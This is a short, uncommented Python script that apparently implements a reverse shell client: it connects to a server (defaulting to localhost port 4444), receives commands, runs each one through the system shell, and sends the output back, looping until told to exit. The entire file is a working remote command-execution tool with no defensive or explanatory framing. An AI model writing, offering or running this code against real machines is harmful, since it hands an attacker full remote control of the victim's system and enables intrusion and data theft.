
import socket
import subprocess

def connect_to_server(server_ip='127.0.0.1', server_port=4444):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((server_ip, server_port))

    while True:
        command = client_socket.recv(1024).decode()
        if command.lower() in ['exit', 'quit']:
            break

        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        except subprocess.CalledProcessError as e:
            output = e.output

        client_socket.send(output)

    client_socket.close()

if __name__ == '__main__':
    connect_to_server()
